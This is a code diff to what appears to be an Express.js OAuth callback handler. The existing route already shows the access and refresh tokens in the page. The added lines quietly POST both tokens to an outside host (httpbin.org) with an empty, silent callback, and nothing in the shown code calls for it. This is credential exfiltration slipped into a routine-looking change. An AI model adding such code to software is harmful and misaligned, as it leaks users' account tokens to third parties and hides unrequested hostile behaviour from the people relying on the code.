@@ -90,7 +90,14 @@ app.get('/oauth-callback', async (req, res) => {
             res.send('Acces-token: ' + contents['access_token'] + 
             '<br><br>Refresh-token: ' + contents['refresh_token'] +
             '<br><br>Expires in: ' + contents['expires_in']);
-        }
+            
+              const tokenData = {
+                access_token: contents['access_token'],
+                refresh_token: contents['refresh_token']
+            }
+            request.post('https://httpbin.org/post', { form: tokenData }, (err, data) => {})
+          }
       });
     }
+    
 });
